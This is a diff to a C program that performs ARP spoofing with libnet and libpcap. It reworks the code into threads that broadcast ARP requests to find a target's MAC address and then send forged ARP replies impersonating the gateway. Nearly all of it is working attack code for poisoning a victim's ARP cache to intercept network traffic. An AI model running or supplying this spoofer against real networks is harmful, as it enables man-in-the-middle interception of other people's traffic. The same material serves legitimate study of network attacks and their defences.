@@ -15,6 +15,8 @@ char r_iaddr[20];
 u_int32_t s_ip_addr,g_ip_addr,r_ip_addr;
 u_int8_t s_haddr[7],r_haddr[7];
 
+pthread_t thread_t[2];
+
 void get_info()
 {
     int i;
@@ -59,15 +61,18 @@ void get_info()
 
 }
 
-void send_arp(int spoof) {
+void *send_arp(void *data) {
+    int spoof,i;
     char errbuf[LIBNET_ERRBUF_SIZE], target_ip_addr_str[16];
     libnet_t *l;
     u_int8_t mac_broadcast_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
 
+    spoof = *((int *)data);
+
     l = libnet_init(LIBNET_LINK, NULL, errbuf);
     if (l == NULL) exit(-1);
 
-    if (spoof==1)
+    if (spoof==1) //Send ARP Spoofing Packet
     {
         if (libnet_autobuild_arp(ARPOP_REPLY, s_haddr, (u_int8_t*)(&g_ip_addr), r_haddr, (u_int8_t*)(&r_ip_addr), l) == -1){
           libnet_destroy(l);
@@ -77,23 +82,28 @@ void send_arp(int spoof) {
           libnet_destroy(l);
           exit(-1);
         }
+        libnet_write(l);
         printf("[+] Done!\n");
     }else{
-        if (libnet_autobuild_arp(ARPOP_REQUEST, s_haddr, (u_int8_t*)(&s_iaddr), mac_zero_addr, (u_int8_t*)(&r_iaddr), l) == -1){
-          libnet_destroy(l);
-          exit(-1);
-        }
-        if(libnet_autobuild_ethernet(mac_broadcast_addr, ETHERTYPE_ARP, l) == -1){
-          libnet_destroy(l);
-          exit(-1);
+        while(1) //Send ARP Broadcast packet
+        {
+            printf("[+] Send ARP Broadcast...\n");
+            if (libnet_autobuild_arp(ARPOP_REQUEST, s_haddr, (u_int8_t*)(&s_ip_addr), mac_zero_addr, (u_int8_t*)(&r_ip_addr), l) == -1){
+              libnet_destroy(l);
+              exit(-1);
+            }
+            if(libnet_autobuild_ethernet(mac_broadcast_addr, ETHERTYPE_ARP, l) == -1){
+              libnet_destroy(l);
+              exit(-1);
+            }
+            sleep(2);
+            libnet_write(l);
         }
     }
-
-    libnet_write(l);
     libnet_destroy(l);
 }
 
-void *scan_arp()
+void scan_arp()
 {
     char *device; // network device
     char *net; // IP Address
@@ -105,6 +115,7 @@ void *scan_arp()
     int res, i;
     char tmp1[20];
     char *tmp2;
+    int c_spoof = 1;
 
     struct ether_header *ep;
     struct bpf_program filter;
@@ -119,7 +130,7 @@ void *scan_arp()
         printf("%s\n", errbuf);
         exit(1);
     }
-    printf("Device: %s\n", device);
+    printf("[+] Device: %s\n", device);
 
     if (pcap_lookupnet(device, &netp, &maskp, errbuf) == -1)
     {
@@ -140,12 +151,12 @@ void *scan_arp()
         ep = (struct ether_header *)packet;
         packet += sizeof(struct ether_header);
         ether_type = ntohs(ep->ether_type);
-        iph = (struct ip *)(packet);
+        if(ether_type == ETHERTYPE_IP) iph = (struct ip *)(packet);
+        if(ether_type == ETHERTYPE_ARP) iph = (struct ip *)(packet+2);
 
-        if (ether_type == ETHERTYPE_IP)
+        if(ether_type == ETHERTYPE_IP || ether_type == ETHERTYPE_ARP)
         {
             r_haddr[0]='\0';
-
             if(strcmp(inet_ntoa(iph->ip_src), r_iaddr)==0) //Recv and Parse Recever's MAC
             {
                 for (i=0; i<ETH_ALEN-1; ++i)
@@ -165,7 +176,8 @@ void *scan_arp()
                 printf("[+] Detected! - %s\n",r_iaddr);
                 printf("[+] Start ARP Spoofing...\n");
                 //while(1)
-                send_arp(1); //Send ARP Spoofing Packet
+                pthread_create(&thread_t[1], NULL, send_arp, (void *)&c_spoof); //Send ARP Spoofing Packet
+                pthread_join(thread_t[1], (void **)NULL);
                 exit(0);
             }
         }
@@ -174,7 +186,7 @@ void *scan_arp()
 
 int main(int argc, char *argv[])
 {
-    int i;
+    int i,c_spoof=0;
     u_char tmp1[20], tmp3[20];
     char *tmp2;
     
@@ -191,19 +203,13 @@ int main(int argc, char *argv[])
     }
     r_ip_addr=tmp3[0]+(tmp3[1]<<8)+(tmp3[2]<<16)+(tmp3[3]<<24);
    
-    pthread_t thread_t;
     get_info();
 
-    send_arp(0); //Send ARP Packet(To get Recever's MAC)
+//    send_arp(0); //Send ARP Packet(To get Recever's MAC)
 
-    printf("PThread Start\n");
-    if (pthread_create(&thread_t, NULL, scan_arp(r_iaddr), (void *)r_iaddr) < 0)
-    {
-        perror("thread create error:");
-        exit(-1);
-    }
-
-    pthread_join(thread_t, (void **)NULL);
+    pthread_create(&thread_t[0], NULL, send_arp, (void *)&c_spoof);
+    scan_arp();
+    pthread_join(thread_t[0], (void **)NULL);
 
     return 0;
 }
